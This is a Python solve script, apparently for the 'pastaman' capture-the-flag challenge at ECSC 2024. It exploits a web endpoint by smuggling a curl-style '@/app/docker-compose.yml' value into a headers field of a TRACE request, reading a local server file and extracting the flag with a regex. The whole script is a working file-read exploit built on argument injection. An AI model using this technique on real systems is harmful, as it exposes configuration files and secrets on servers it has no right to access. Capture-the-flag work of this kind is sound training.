#!/usr/bin/env python3

import logging
import os
import requests
import re

logging.disable()

URL = os.environ.get("URL", "http://pastaman.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

r = requests.post(URL + '/request.php', data={'path': '/', 'method': 'TRACE', 'headers[]': '@/app/docker-compose.yml'})
r.raise_for_status()

flag = re.search(r'TeamItaly\{.+\}', r.text).group(0)
print(flag)
